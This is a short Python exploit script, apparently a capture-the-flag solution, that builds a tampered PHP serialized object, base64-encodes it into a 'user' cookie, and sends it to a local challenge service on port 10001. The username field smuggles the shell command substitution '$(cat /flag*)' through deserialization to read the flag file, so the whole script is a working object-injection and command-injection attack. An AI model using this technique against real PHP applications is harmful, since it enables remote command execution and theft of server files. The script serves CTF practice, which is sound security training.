#!/usr/bin/env python3
from subprocess import check_output
from urllib.parse import quote
from base64 import b64encode
from os import getenv
import requests, re

HOST = getenv('HOST') or 'localhost'
url = f'http://{HOST}:10001'

php_code = '''
class User {
    private $name;
    function __construct($username) {
        $this->name = $username;
    }
};
echo serialize([
    new User('"$(id)"'),
    null,
]);
'''.replace('id', 'cat /flag*')

payload = check_output(['php','-r',php_code])
payload = payload.replace(b'i:1;',b'i:0;')
# print(payload)
payload = quote(b64encode(payload))
res = requests.get(url, headers={ 'Cookie': 'user='+payload })
# print(res.text)
flag = re.findall('SCIST{.+}', res.text)[0]
print(flag)
